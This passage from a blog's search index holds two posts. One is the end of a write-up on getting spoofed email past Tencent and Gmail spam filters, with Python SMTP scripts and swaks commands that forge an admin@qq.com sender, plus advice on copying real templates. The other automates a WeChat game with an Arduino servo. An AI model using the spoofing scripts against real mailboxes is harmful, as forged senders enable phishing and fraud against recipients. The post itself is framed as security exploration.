<p>The email will be detected as spam as well. I kept looking for the suspicious features and I found that the suffix of the <em>Message-Id</em> is <em>@kali</em>, maybe I can try to handle it in the further post.</p>
<img src="/2019/12/04/The-Spam-Filters-Bypassing/pic_8.png" width="60%" height="60%">

<p>Let’s focus on the Tencent mailbox. I wrote a simple script to use the Tencent SMTP server to send the fake email automatically.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"><span class="keyword">from</span> email.header <span class="keyword">import</span> Header</span><br><span class="line"><span class="keyword">from</span> smtplib <span class="keyword">import</span> SMTP_SSL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">host_server = <span class="string">&#x27;smtp.qq.com&#x27;</span></span><br><span class="line">sender_qq = <span class="string">&#x27;1234567&#x27;</span></span><br><span class="line">pwd = <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line">sender_qq_mail = <span class="string">&#x27;1234567@qq.com&#x27;</span></span><br><span class="line">receiver = <span class="string">&#x27;1234567@qq.com&#x27;</span></span><br><span class="line">mail_content = <span class="string">&#x27;This is a test mail.&#x27;</span></span><br><span class="line">mail_title = <span class="string">&#x27;Test&#x27;</span></span><br><span class="line"></span><br><span class="line">smtp = SMTP_SSL(host_server)</span><br><span class="line">smtp.ehlo(host_server)</span><br><span class="line">smtp.login(sender_qq, pwd)</span><br><span class="line"></span><br><span class="line">msg = MIMEText(mail_content, <span class="string">&quot;plain&quot;</span>, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">msg[<span class="string">&quot;Subject&quot;</span>] = Header(mail_title, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">msg[<span class="string">&quot;From&quot;</span>] = Header(<span class="string">&quot;admin@qq.com&quot;</span>, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">msg[<span class="string">&quot;To&quot;</span>] = receiver</span><br><span class="line">smtp.sendmail(sender_qq_mail, receiver, msg.as_string())</span><br><span class="line">smtp.quit()</span><br></pre></td></tr></table></figure>

<p>But the email was rejected by the Tencent SMTP server directly. </p>
<img src="/2019/12/04/The-Spam-Filters-Bypassing/pic_10.png" width="60%" height="60%">

<p>So I changed the SMTP server to smtp2go.com. The fake email was received successfully without being detected as spam, but the victim can notice the forwarding server in the email title.</p>
<img src="/2019/12/04/The-Spam-Filters-Bypassing/pic_1.png" width="60%" height="60%">

<p>I changed the target mailbox to Gmail and tested the <em>swaks</em> command and the python script.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">swaks --header-X-Mailer smtp2go.com --to recursively.z@gmail.com --from xx@smtp2go.com --h-From: &#x27;admin&lt;admin@qq.com&gt;&#x27;  --body body.txt --ehlo qq.com --server mail.smtp2go.com -p 2525 -au xxx -ap xxx</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"><span class="keyword">from</span> email.header <span class="keyword">import</span> Header</span><br><span class="line"></span><br><span class="line">mail_host=<span class="string">&quot;mail.smtp2go.com&quot;</span></span><br><span class="line">mail_user=<span class="string">&quot;xxx&quot;</span></span><br><span class="line">mail_pass=<span class="string">&quot;xxx&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sender = <span class="string">&#x27;test@smtp2go.com&#x27;</span></span><br><span class="line">receivers = [<span class="string">&#x27;recursively.z@gmail.com&#x27;</span>]</span><br><span class="line"></span><br><span class="line">message = MIMEText(<span class="string">&#x27;This is a test mail&#x27;</span>, <span class="string">&#x27;plain&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">message[<span class="string">&#x27;From&#x27;</span>] = Header(<span class="string">&quot;admin@qq.com&quot;</span>, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">message[<span class="string">&#x27;To&#x27;</span>] =  Header(receivers[<span class="number">0</span>], <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">subject = <span class="string">&#x27;Test&#x27;</span></span><br><span class="line">message[<span class="string">&#x27;Subject&#x27;</span>] = Header(subject, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    smtpObj = smtplib.SMTP()</span><br><span class="line">    smtpObj.connect(mail_host, <span class="number">2525</span>)</span><br><span class="line">    smtpObj.login(mail_user,mail_pass)</span><br><span class="line">    smtpObj.sendmail(sender, receivers, message.as_string())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Success&quot;</span>)</span><br><span class="line"><span class="keyword">except</span> smtplib.SMTPException:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Error&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>The command and script can bypass the Gmail spam filter. And the forwarding server can be seen in the email title as I mentioned above.</p>
<img src="/2019/12/04/The-Spam-Filters-Bypassing/pic_9.png" width="40%" height="40%">

<p>You could copy the email templates to make your email look real. Duplicate the content of the email template you chose.</p>
<img src="/2019/12/04/The-Spam-Filters-Bypassing/pic_13.png" width="40%" height="40%">

<p>To render the email content properly, the right <em>Content-Type</em> header is necessary.</p>
<img src="/2019/12/04/The-Spam-Filters-Bypassing/pic_14.png" width="40%" height="40%">

<p>We could use the swaks argument <em>–add-header</em> to achieve that.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">swaks --header-X-Mailer smtp2go.com --to recursively.z@gmail.com --from xx@smtp2go.com --h-From: &#x27;admin&lt;admin@qq.com&gt;&#x27;  --body body.txt --add-header &#x27;Content-Type: multipart/alternative; boundary=&quot;----=_Part_3446155_1116810407.1576461749230&quot;&#x27; --ehlo qq.com --server mail.smtp2go.com -p 2525 -au xxx -ap xxx</span><br></pre></td></tr></table></figure>

<p>Finally let’s take a look at the effect.</p>
<img src="/2019/12/04/The-Spam-Filters-Bypassing/pic_15.png" width="40%" height="40%">

<p>For the methods discussed above, all of them cannot perform a perfect email attack. But if you are not careful enough, you will be hacked through social engineering phishing.</p>
]]></content>
      <categories>
        <category>Social Engineering</category>
      </categories>
      <tags>
        <tag>Fake email</tag>
      </tags>
  </entry>
  <entry>
    <title>Tricks for Wechat Tiaoyitiao Mini Program</title>
    <url>/2018/05/11/Tricks-for-Wechat-Tiaoyitiao-Mini-Program/</url>
    <content><![CDATA[<h2 id="How-does-it-act"><a href="#How-does-it-act" class="headerlink" title="How does it act?"></a>How does it act?</h2><img src="/2018/05/11/Tricks-for-Wechat-Tiaoyitiao-Mini-Program/pic_1.GIF" width="60%" height="60%">

<h2 id="Distinguish-the-Screenshot"><a href="#Distinguish-the-Screenshot" class="headerlink" title="Distinguish the Screenshot"></a>Distinguish the Screenshot</h2><p>First of all, we need to work out the program to distinguish the chess piece and board, furthermore, finding the distance between the chess piece and the target position and calculating the pressing time. It’s definitely a complicated process. I used the open-source project <a href="https://github.com/wangshub/wechat_jump_game">https://github.com/wangshub/wechat_jump_game</a>. We should connect the mobile phone to the computer with USB and make sure that we have installed android adb debug command so that the mobile phone can take screenshots via the program for the next manipulation.</p>
<h2 id="Control-the-Servo-With-Arduino"><a href="#Control-the-Servo-With-Arduino" class="headerlink" title="Control the Servo With Arduino"></a>Control the Servo With Arduino</h2><p>I wrote the C program with Arduino IDE, the Arduino serial only accepts string type input, for convenience I use the char_to_int(char i) function to transform the input type. The servo moves to an angle decided by the .write(angle) method, the parameter angle can be different in other situations. The delay time is associated with pressing time based on the distance between the target position and chess piece.</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Servo.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">Servo myservo;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">char_to_int</span><span class="params">(<span class="type">char</span> i)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span>(i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;0&#x27;</span>:<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;2&#x27;</span>:<span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;3&#x27;</span>:<span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;4&#x27;</span>:<span class="keyword">return</span> <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;5&#x27;</span>:<span class="keyword">return</span> <span class="number">5</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;6&#x27;</span>:<span class="keyword">return</span> <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;7&#x27;</span>:<span class="keyword">return</span> <span class="number">7</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;8&#x27;</span>:<span class="keyword">return</span> <span class="number">8</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;9&#x27;</span>:<span class="keyword">return</span> <span class="number">9</span>;</span><br><span class="line">        <span class="keyword">default</span>:<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line">    Serial.begin(<span class="number">9600</span>);</span><br><span class="line">    pinMode(<span class="number">10</span>, OUTPUT);</span><br><span class="line">    myservo.attach(<span class="number">10</span>);</span><br><span class="line">    myservo.write(<span class="number">0</span>);</span><br><span class="line">    delay(<span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> a, b, c;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">while</span>(!Serial.available());</span><br><span class="line">    <span class="keyword">if</span>(Serial.available())</span><br><span class="line">    &#123;</span><br><span class="line">        a = Serial.read();</span><br><span class="line">        delay(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(Serial.available())</span><br><span class="line">    &#123;</span><br><span class="line">        b = Serial.read();</span><br><span class="line">        delay(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(Serial.available())</span><br><span class="line">    &#123;</span><br><span class="line">        c = Serial.read();</span><br><span class="line">        delay(<span class="number">3</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(b == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        i = char_to_int(a);</span><br><span class="line">        Serial.println(i, DEC);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(c == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        i = char_to_int(a) * <span class="number">10</span> + char_to_int(b);</span><br><span class="line">        Serial.println(i, DEC);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        i = char_to_int(a) * <span class="number">100</span> + char_to_int(b) * <span class="number">10</span> + char_to_int(c);</span><br><span class="line">        Serial.println(i, DEC);</span><br><span class="line">    &#125;</span><br><span class="line">    i = i*<span class="number">23</span>;</span><br><span class="line"></span><br><span class="line">    myservo.write(<span class="number">60</span>);</span><br><span class="line">    delay(i);</span><br><span class="line"></span><br><span class="line">    myservo.write(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Control-the-Arduino-Serial"><a href="#Control-the-Arduino-Serial" class="headerlink" title="Control the Arduino Serial"></a>Control the Arduino Serial</h2><p>In order to control the Arduino serial input value, we can use the serial monitor embedded in the Arduino IDE. And we can also use python to Implement the same functionality.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"><span class="comment">#coding=utf-8  </span></span><br><span class="line"><span class="keyword">import</span> serial </span><br><span class="line"><span class="comment">#from serial import * </span></span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line"><span class="keyword">import</span> threading  </span><br><span class="line"><span class="keyword">import</span> glob  </span><br><span class="line">  </span><br><span class="line">inhead = <span class="string">&#x27;RECV&#x27;</span>      </span><br><span class="line">outhead = <span class="string">&#x27;SEND&#x27;</span>     </span><br><span class="line">      </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SerialData</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):  </span><br><span class="line">        threading.Thread.__init__(self)     </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">open_com</span>(<span class="params">self, port, baud</span>):         </span><br><span class="line">        self.ser = serial.Serial(port, baud, timeout = <span class="number">0.5</span>)  </span><br><span class="line">        <span class="keyword">return</span> self.ser  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">com_isopen</span>(<span class="params">self</span>):                       </span><br><span class="line">        <span class="keyword">return</span> self.ser.isOpen()  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send_data</span>(<span class="params">self, data, outhead = outhead</span>):   </span><br><span class="line">        self.ser.write(outhead + data)    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">next</span>(<span class="params">self</span>):                                      </span><br><span class="line">        all_data = <span class="string">&#x27;&#x27;</span>                             </span><br><span class="line">        <span class="comment">#if inhead == self.ser.read(1) :  </span></span><br><span class="line">        all_data =  self.ser.readline()     </span><br><span class="line">        <span class="keyword">return</span>  all_data  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">close_listen_com</span>(<span class="params">self</span>):                 </span><br><span class="line">        <span class="keyword">return</span> self.ser.close()  </span><br><span class="line">      </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        rec_data = SerialData()                 </span><br><span class="line">        allport = glob.glob(<span class="string">&#x27;/dev/ttyACM*&#x27;</span>)  </span><br><span class="line">        port = allport[<span class="number">0</span>]                             </span><br><span class="line">        baud = <span class="number">9600</span>    </span><br><span class="line">        openflag = rec_data.open_com(port, baud) </span><br><span class="line">        <span class="keyword">if</span> openflag:  </span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;i open %s at %s successfully!&#x27;</span>%(allport[<span class="number">0</span>], baud)  </span><br><span class="line">        rec_data.send_data(<span class="string">&#x27;90&#x27;</span>)</span><br><span class="line">       </span><br><span class="line">        rec_data.close_listen_com()</span><br><span class="line">          </span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:             </span><br><span class="line">        rec_data.close_listen_com()</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> rec_data.com_isopen():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;serial closed&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h2 id="Combine-the-Codes"><a href="#Combine-the-Codes" class="headerlink" title="Combine the Codes"></a>Combine the Codes</h2><p>The last step is combining the picture distinguishing code and the serial controlling code. I’ve run the code with python3.6 and the whole process performed well.</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Arduino</tag>
      </tags>
  </entry>
</search>
